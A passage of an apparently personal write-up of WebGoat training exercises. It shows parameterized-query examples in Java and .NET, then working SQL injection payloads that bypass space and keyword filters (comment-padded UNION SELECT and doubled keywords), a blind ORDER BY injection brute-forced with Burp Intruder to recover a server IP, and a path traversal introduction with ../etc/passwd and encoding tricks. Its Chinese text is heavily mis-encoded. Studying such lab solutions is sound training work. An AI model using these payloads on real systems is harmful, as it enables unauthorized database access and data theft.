<li><strong>çµæ´»çš„æŸ¥è¯¢</strong>ï¼šä½ å¯ä»¥ä½¿ç”¨ <code>PreparedStatement</code> çš„ <code>setXXX()</code> æ–¹æ³•ï¼ˆä¾‹å¦‚ <code>setString()</code>, <code>setInt()</code>, <code>setDouble</code> ç­‰ï¼‰æ¥è®¾ç½®å‚æ•°å€¼ï¼Œè¿™ä½¿å¾—æŸ¥è¯¢æ›´åŠ çµæ´»å’Œæ˜“äºç®¡ç†ã€‚</li>
</ol>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ <code>PreparedStatement</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreparedStatementExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mydatabase&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;username&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> <span class="string">&quot;john@example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT status FROM users WHERE name=? AND mail=?&quot;</span>;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">            ps.setString(<span class="number">1</span>, name);</span><br><span class="line">            ps.setString(<span class="number">2</span>, email);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Status: &quot;</span> + rs.getString(<span class="string">&quot;status&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªåˆ°æ•°æ®åº“çš„è¿æ¥ï¼Œç„¶åå‡†å¤‡ä¸€ä¸ªé¢„ç¼–è¯‘çš„ SQL æŸ¥è¯¢ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>setString()</code> æ–¹æ³•ä¸ºå ä½ç¬¦è®¾ç½®å€¼ï¼Œå¹¶æ‰§è¡ŒæŸ¥è¯¢ã€‚æœ€åï¼Œæˆ‘ä»¬éå†ç»“æœé›†å¹¶æ‰“å°å‡ºçŠ¶æ€ä¿¡æ¯ã€‚</p>
<h4 id="5-6">5.</h4>
<p>æ‚¨å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°ä¸€äº›ä»£ç ï¼Œä½†è¿™äº›ä»£ç ä¸å®Œæ•´ã€‚å®Œæˆä»£ç ï¼Œä½¿å…¶ä¸å†å®¹æ˜“å—åˆ° SQL æ³¨å…¥çš„æ”»å‡»ï¼ä½¿ç”¨æ‚¨ä¹‹å‰å­¦è¿‡çš„ç±»å’Œæ–¹æ³•ã€‚</p>
<p>ä»£ç å¿…é¡»æ ¹æ®ç”¨æˆ·çš„åç§°å’Œé‚®ä»¶åœ°å€æ£€ç´¢ç”¨æˆ·çš„çŠ¶æ€ã€‚åç§°å’Œé‚®ä»¶å‡é‡‡ç”¨å­—ç¬¦ä¸²æ ¼å¼ã€‚</p>
<p>æ ¹æ®é¢˜æ„ï¼Œä½¿ç”¨PreparedStatementæŸ¥è¯¢æ•°æ®åº“</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™è¡Œä»£ç ä½¿ç”¨DriverManagerç±»çš„getConnectionæ–¹æ³•æ¥å»ºç«‹ä¸æ•°æ®åº“çš„è¿æ¥ã€‚å®ƒéœ€è¦ä¸‰ä¸ªå‚æ•°ï¼š</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBURL`ï¼šæ•°æ®åº“çš„URLæˆ–åœ°å€ã€‚</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBUSER`ï¼šç”¨äºè¿æ¥åˆ°æ•°æ®åº“çš„ç”¨æˆ·åã€‚</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBPW`ï¼šç”¨äºè¿æ¥åˆ°æ•°æ®åº“çš„å¯†ç ã€‚é€šè¿‡è¿™äº›å‚æ•°ï¼Œä»£ç å°è¯•ä¸æ•°æ®åº“å»ºç«‹è¿æ¥ï¼Œå¹¶å°†è¿”å›çš„`Connection`å¯¹è±¡å­˜å‚¨åœ¨åä¸º`conn`çš„å˜é‡ä¸­ã€‚</span></span><br><span class="line">Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªPreparedStatementå¯¹è±¡ã€‚PreparedStatementæ˜¯ç”¨æ¥æ‰§è¡Œå‚æ•°åŒ–SQLæŸ¥è¯¢çš„ã€‚è¿™é‡Œï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªæŸ¥è¯¢ï¼Œè¯¥æŸ¥è¯¢ä»åä¸ºâ€œ<span class="built_in">users</span>â€çš„è¡¨ä¸­é€‰æ‹©â€œstatusâ€å­—æ®µï¼Œå…¶ä¸­â€œnameâ€å’Œâ€œmailâ€å­—æ®µçš„å€¼å¿…é¡»ä¸ç»™å®šçš„å‚æ•°åŒ¹é…ã€‚</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> `?`ï¼šè¿™äº›æ˜¯å‚æ•°å ä½ç¬¦ã€‚åœ¨åç»­çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨`setString`æ–¹æ³•ä¸ºè¿™äº›å ä½ç¬¦è®¾ç½®å®é™…çš„å€¼ã€‚ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢çš„å¥½å¤„æ˜¯å¯ä»¥é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ï¼Œå¹¶ä¸”å¯ä»¥æ›´æœ‰æ•ˆåœ°ä¸æ•°æ®åº“é€šä¿¡ã€‚</span></span><br><span class="line">PreparedStatement ps = conn.prepareStatement(&quot;SELECT status FROM users WHERE name</span><br><span class="line">? AND mail=?&quot;);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™è¡Œä»£ç ä¸ºç¬¬ä¸€ä¸ªå‚æ•°å ä½ç¬¦è®¾ç½®äº†å€¼ã€‚å®ƒå°†ç¬¬ä¸€ä¸ªå ä½ç¬¦çš„å€¼è®¾ç½®ä¸ºå˜é‡nameçš„å€¼ã€‚åœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¿™æ˜¯å°†æŸ¥è¯¢ä¸­çš„â€œnameâ€å­—æ®µçš„å€¼è®¾ç½®ä¸ºæŸä¸ªç‰¹å®šçš„ç”¨æˆ·åã€‚</span></span><br><span class="line">ps.setString(1, name);</span><br><span class="line">ps.setString(2, mail);</span><br></pre></td></tr></table></figure>
<h4 id="6-4">6.</h4>
<p>è¯•è¯•å§ï¼ç¼–å†™å®‰å…¨ä»£ç <br>
ç°åœ¨æ˜¯æ—¶å€™ç¼–å†™è‡ªå·±çš„ä»£ç äº†ï¼ æ‚¨çš„ä»»åŠ¡æ˜¯ä½¿ç”¨ JDBC è¿æ¥åˆ°æ•°æ®åº“å¹¶ä»ä¸­è¯·æ±‚æ•°æ®ã€‚</p>
<p>è¦æ±‚ï¼š</p>
<ol>
<li>
<p>è¿æ¥åˆ°æ•°æ®åº“</p>
</li>
<li>
<p>å¯¹ä¸å— SQL æ³¨å…¥æ”»å‡»çš„æ•°æ®åº“æ‰§è¡ŒæŸ¥è¯¢</p>
</li>
<li>
<p>æŸ¥è¯¢éœ€è¦åŒ…å«è‡³å°‘ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°</p>
</li>
</ol>
<p>å¼€å§‹ä¹‹å‰çš„ä¸€äº›æç¤ºï¼š<br>
è¦è¿æ¥åˆ°æ•°æ®åº“ï¼Œæ‚¨å¯ä»¥ç®€å•åœ°å‡è®¾ç»™å®šçš„å¸¸é‡ DBURLã€DBUSER å’Œ DBPWã€‚<br>
æŸ¥è¯¢çš„å†…å®¹æ— å…³ç´§è¦ï¼Œåªè¦ SQL æœ‰æ•ˆä¸”æ»¡è¶³è¦æ±‚å³å¯ã€‚<br>
æ‚¨ç¼–å†™çš„æ‰€æœ‰ä»£ç éƒ½å°†æ’å…¥åˆ°å·²å¯¼å…¥ java.sql.* çš„åä¸ºâ€œTestClassâ€çš„ Java ç±»çš„ main æ–¹æ³•ä¸­ã€‚</p>
<p>æ²¡æœ‰è¶³å¤Ÿçš„åˆ›æ„æ¥æ€è€ƒè‡ªå·±çš„é—®é¢˜ï¼Ÿæ‚¨å°è¯•ä»åä¸º users çš„è™šæ„æ•°æ®åº“è¡¨ä¸­æ£€ç´¢å…·æœ‰ç‰¹å®šåç§°çš„ç”¨æˆ·çš„æ•°æ®æ€ä¹ˆæ ·ï¼Ÿ</p>
<p>ä¾‹å¦‚ï¼šä¸‹é¢çš„ä»£ç å¯ä»¥ç¼–è¯‘è€Œä¸ä¼šå‡ºç°ä»»ä½•é”™è¯¯ï¼ˆä½†å½“ç„¶ä¸ç¬¦åˆå®Œæˆæœ¬è¯¾çš„è¦æ±‚ï¼‰ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Connection conn = null;</span><br><span class="line">    System.out.println(conn);   //should output &#x27;null&#x27;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    System.out.println(&quot;Oops. Something went wrong!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨æ‚¨çš„çŸ¥è¯†ï¼Œåœ¨ä¸‹é¢çš„ç¼–è¾‘å™¨çª—å£ä¸­ä»å¤´å¼€å§‹ç¼–å†™ä¸€äº›æœ‰æ•ˆçš„ä»£ç ï¼ ï¼ˆå¦‚æœæ‚¨æ— æ³•åœ¨é‚£é‡Œè¾“å…¥ï¼Œè°ƒæ•´ä¸€æ¬¡æµè§ˆå™¨çª—å£çš„å¤§å°å¯èƒ½ä¼šæœ‰æ‰€å¸®åŠ©ï¼Œé‚£ä¹ˆå®ƒåº”è¯¥å¯ä»¥å·¥ä½œï¼‰ï¼š</p>
<p>å› ä¸ºå·²ç»å¯¼å…¥æ‰€æœ‰åŒ…äº†ï¼Œç°åœ¨åªéœ€è¦å†™ä¸»è¦ä»£ç å°±è¡Œäº†</p>
<p>ä¸»è¦ä¸è¦å¿˜è®°<code>ResultSet res = ps.executeQuery();</code>æ–½è¡ŒæŸ¥è¯¢æ“ä½œ</p>
<blockquote>
<p><code>ResultSet res = ps.executeQuery();</code> æ˜¯åœ¨Javaçš„JDBCï¼ˆJava Database Connectivityï¼‰ç¼–ç¨‹ä¸­å¸¸è§çš„ä¸€è¡Œä»£ç ï¼Œå®ƒæ‰§è¡Œä¸€ä¸ªSQLæŸ¥è¯¢å¹¶è¿”å›ä¸€ä¸ª<code>ResultSet</code>å¯¹è±¡ã€‚</p>
<ul>
<li><code>ps</code> æ˜¯ä¸€ä¸ª <code>PreparedStatement</code> å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†ä¸€ä¸ªé¢„ç¼–è¯‘çš„SQLæŸ¥è¯¢ã€‚</li>
<li><code>executeQuery</code> æ˜¯ <code>PreparedStatement</code> çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºæ‰§è¡ŒæŸ¥è¯¢å¹¶è¿”å›ä¸€ä¸ª <code>ResultSet</code> å¯¹è±¡ã€‚</li>
<li><code>ResultSet</code> å¯¹è±¡åŒ…å«äº†æŸ¥è¯¢çš„ç»“æœé›†ï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>ResultSet</code> çš„æ–¹æ³•æ¥è·å–å’Œå¤„ç†æŸ¥è¯¢è¿”å›çš„æ•°æ®ã€‚</li>
</ul>
<p>å…·ä½“æ¥è¯´ï¼Œè¿™ä¸€è¡Œä»£ç æ‰§è¡ŒSQLæŸ¥è¯¢ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨<code>res</code>å˜é‡ä¸­ï¼Œç„¶åä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ª <code>ResultSet</code> å¯¹è±¡æ¥å¤„ç†æŸ¥è¯¢è¿”å›çš„æ•°æ®ã€‚</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line">    String sql = &quot;select * from users where name = ?&quot;;</span><br><span class="line">    PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">    ps.setString(1, &quot;name&quot;);</span><br><span class="line">    ResultSet res = ps.executeQuery();</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    System.out.println(&quot;Oops. Something went wrong!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="7">7</h4>
<p>ä¸Šé¢æ˜¯javaï¼Œ<a target="_blank" rel="noopener" href="http://xn--3dsq36aj9j.net">ç°åœ¨æ˜¯.net</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - .NET</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> bool <span class="title function_">isUsernameValid</span><span class="params">(string username)</span> &#123;</span><br><span class="line">	<span class="type">RegEx</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Regex</span>(<span class="string">&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;</span>);</span><br><span class="line">	Return r.isMatch(username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SqlConnection conn is set and opened elsewhere for brevity.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">string</span> <span class="variable">selectString</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user_table WHERE username = @userID&quot;</span>;</span><br><span class="line">	<span class="type">SqlCommand</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlCommand</span>( selectString, conn );</span><br><span class="line">	<span class="keyword">if</span> ( isUsernameValid( uid ) ) &#123;</span><br><span class="line">		cmd.Parameters.Add( <span class="string">&quot;@userID&quot;</span>, SqlDbType.VarChar, <span class="number">16</span> ).Value = uid;</span><br><span class="line">		<span class="type">SqlDataReader</span> <span class="variable">myReader</span> <span class="operator">=</span> cmd.ExecuteReader();</span><br><span class="line">		<span class="keyword">if</span> ( myReader ) &#123;</span><br><span class="line">			<span class="comment">// make the user record active in some way.</span></span><br><span class="line">			myReader.Close();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; <span class="comment">// handle invalid input &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e) &#123; <span class="comment">// Handle all exceptions... &#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="9-2">9.</h4>
<p>ç»™äº†ä¸ªæ–‡ç« è®©æˆ‘ä»¬å»çœ‹</p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/marcan42/status/1238004834806067200?s=21">https://twitter.com/marcan42/status/1238004834806067200?s=21</a></p>
<p>ä½†æ˜¯æˆ‘å»çœ‹çš„æ—¶å€™å‘ç°æ–‡ç« æ²¡äº†ã€‚ã€‚ã€‚</p>
<p>ç›´æ¥çœ‹é¢˜å§</p>
<p>é€šè¿‡å°è¯•å‘ç°è¿‡æ»¤äº†ç©ºæ ¼</p>
<p>æˆ‘ä»¬ç›´æ¥å…¶ä»–ç¬¦å·ç»•è¿‡å°±è¡Œäº†</p>
<p>æˆ‘ç”¨çš„æ˜¯ <code>/**/</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;/**/UNION/**/SELECT/**/userid,user_name,/**/password,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,1/**/from/**/user_system_data--&#x27;</span><br></pre></td></tr></table></figure>
<p>ç„¶åç”¨<code>//</code>æ³¨é‡Šç¬¦å·ä¹Ÿè¡Œ</p>
<h4 id="10-2">10.</h4>
<p>æˆ‘ä»¬å…ˆå°è¯•è¾“å…¥</p>
<p>å‘ç°æ¯ä¸€æ¬¡è¾“å…¥select å’Œ fromåœ¨è¿”å›çš„ç»“æœä¸­éƒ½ä¼šæ¶ˆå¤±</p>
<p>è¯´æ˜è¿™é¢˜é™¤äº†è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä¹Ÿè¿‡æ»¤äº†å…³é”®å­—ï¼Œå³selectï¼Œfromï¼Œæˆ‘ä»¬åŒå†™ç»•è¿‡å°±è¡Œäº†</p>
<p>åŸç†ï¼šä»–åªä¼šè¿‡æ»¤ä¸€æ¬¡ï¼Œå³SELselectECtè¿‡æ»¤ä¸€æ¬¡ä¼šå˜æˆselectï¼Œä»è€Œè¾¾åˆ°ç»•è¿‡çš„æ•ˆæœ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;/**/UNION/**/SELselectECT/**/userid,user_name,/**/password,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,1/**/frfromom/**/user_system_data--&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="12-2">12.</h4>
<p>åœ¨æ­¤åˆ†é…ä¸­ï¼Œå°è¯•é€šè¿‡ ORDER BY å­—æ®µæ‰§è¡Œ SQL æ³¨å…¥ã€‚ å°è¯•æ‰¾åˆ°æœåŠ¡å™¨çš„ ip åœ°å€ï¼ŒçŒœæµ‹å®Œæ•´çš„ IP åœ°å€å¯èƒ½éœ€è¦å¤ªé•¿æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬ä¸ºæ‚¨æä¾›æœ€åä¸€éƒ¨åˆ†ï¼šwebgoat-prdxxx.130.219.202</p>
<p>æ³¨æ„ï¼šæ­¤åˆ†é…çš„æäº¤å­—æ®µä¸å®¹æ˜“å—åˆ° SQL æ³¨å…¥çš„å½±å“ã€‚</p>
<p>æ ¹æ®æç¤ºå»æŒ‰æ’åºæŒ‰é’®ï¼Œç„¶åæŠ“åŒ…ï¼Œå‘ç°è¯·æ±‚æ˜¯get</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/11.png" alt=""></p>
<p>å‘é€ç»™repeaterï¼Œé€šè¿‡ä¿®æ”¹columnå‘ç°æ’åºæ˜¯æŒ‰å€¼æ¥çš„</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/12.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/13.png" alt=""></p>
<p>è¾“å…¥éæ³•å­—ç¬¦æŠ¥é”™ï¼Œå‘ç°è¡¨åæ˜¯servers</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/14.png" alt=""></p>
<p>æ„é€ ORDER BYè¯­å¥<br>
â‘ æ ¹æ®ä¸Šä¸€ç« èŠ‚11è¯´è¿‡ï¼Œæœ‰order by (case when (true/false) then ip else hostname end<br>
whenä¸ºtrueï¼Œä»¥ipæ’åºã€‚ä¸ºfalseï¼Œä»¥hostnameæ’åºã€‚è¿™ä¸¤ä¸ªå­—æ®µçš„æ’åºå¯ä»¥ç›´æ¥åœ¨ç½‘é¡µä¸Šç‚¹å‡»æ’åºæŒ‰é’®æŸ¥çœ‹ã€‚<br>
â‘¡ä¹‹å‰çš„SQLæ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨è¿‡substr(ip,1,1)=â€™1â€™è¯­å¥ï¼Œè¿”å›å€¼æ˜¯booleanç±»å‹ï¼Œç¬¦åˆâ‘ <br>
â‘¢å¦‚æœç›´æ¥å°†â‘¡è¯­å¥åµŒå¥—åˆ°â‘ ä¸­çš„when (â‘ )çš„è¯ï¼Œè¿™é‡Œçš„ipæ˜¯ç½‘é¡µä¸Šçš„å››ä¸ªipï¼Œwebgoat-prdæœåŠ¡å™¨è¿˜æ˜¯è¢«éšè—ç€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠâ‘¡ä¸­çš„â€œipâ€æ›¿æ¢æˆâ€œselect ip from servers where hostname=â€™webgoat-prdâ€™â€ã€‚<br>
æ ¹æ®â‘¢â‘¡â‘ ç»“åˆå¾—åˆ°ORDER BYè¯­å¥å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY (CASE WHEN (substr((select ip from servers where hostname=&#x27;webgoat-prd&#x27;),1,1)=&#x27;1&#x27;) THEN (ip) ELSE (hostname) END)</span><br></pre></td></tr></table></figure>
<p>ç„¶åå‘é€åˆ°intruderæ¨¡å—çˆ†ç ´</p>
<p>æ‰‹åŠ¨æ›¿æ¢â€œ,â€=â€œ%2Câ€ï¼Œç©ºæ ¼æ›¿æ¢ä¸ºâ€œ+â€å·</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/15.png" alt=""></p>
<p>é€‰æ‹©Cluster bombï¼Œåœ¨ç¬¬ä¸€ä¸ª1å’Œæœ€åä¸€ä¸ª1æ ‡è®°</p>
<p>å› ä¸ºåªéœ€è¦çˆ†ç ´å‰ä¸‰ä¸ªipå€¼ï¼ˆåé¢çš„é¢˜ç›®ç»™äº†ï¼‰ï¼Œç„¶ååé¢å€¼éƒ½æ˜¯0-9ï¼Œå¦‚æ­¤è®¾ç½®</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/17.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/17.png" alt=""></p>
<p>ç„¶åçˆ†ç ´ï¼ŒæŸ¥çœ‹responseéƒ¨åˆ†ï¼Œå¦‚æœæ’åºæ˜¯æŒ‰ipåˆ™æ­£ç¡®</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/18.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/19.png" alt=""></p>
<p>æœ€åå¯ä»¥å¾—å‡ºIPä¸º104.130.219.202</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/20.png" alt=""></p>
<h3 id="4-Path-traversal-è·¯å¾„éå†">4.Path traversal(è·¯å¾„éå†)</h3>
<h4 id="1-2">1.</h4>
<p>Path traversal<br>
A path(directory) traversal is a vulnerability where an attacker is able to access or store files and directories outside the location where the application is running. This may lead to reading files from other directories and in case of a file upload overwriting critical system files.</p>
<p>How does it work?<br>
For example letâ€™s assume we have an application which hosts some files and they can be requested in the following format: now as an attacker you are interested in other files of course so you try . In this case you try walk up to the root of the filesystem and then go into to gain access to this file. The is called dot-dot-slash which is another name for this attack.<a target="_blank" rel="noopener" href="http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../">http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../</a></p>
<p>Of course this is a very simple example and in most cases this will not work as frameworks implemented controls for this, so we need to get a little more creative and start encoding before the request is sent to the server. For example if we URL encode you will get and the web server receiving this request will decode it again to â€¦/â€¦/%2e%2e%2fâ€¦/</p>
<p>Also note that avoiding applications filtering those encodings double encoding might work as well. Double encoding might be necessary in the case where you have a system A which calls system B. System A will only decode once and will call B with the still encoded URL.</p>
<p>è·¯å¾„éå†<br>
è·¯å¾„ï¼ˆç›®å½•ï¼‰éå†æ˜¯ä¸€ç§æ¼æ´ï¼Œæ”»å‡»è€…èƒ½å¤Ÿè®¿é—®æˆ–å­˜å‚¨å¤–éƒ¨çš„æ–‡ä»¶å’Œç›®å½• åº”ç”¨ç¨‹åºè¿è¡Œçš„ä½ç½®ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´ä»å…¶ä»–ç›®å½•è¯»å–æ–‡ä»¶ï¼Œå¦‚æœæ˜¯æ–‡ä»¶ï¼Œåˆ™ä¼šå¯¼è‡´è¯»å–æ–‡ä»¶ ä¸Šä¼ è¦†ç›–å…³é”®ç³»ç»Ÿæ–‡ä»¶ã€‚</p>
<p>å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ<br>
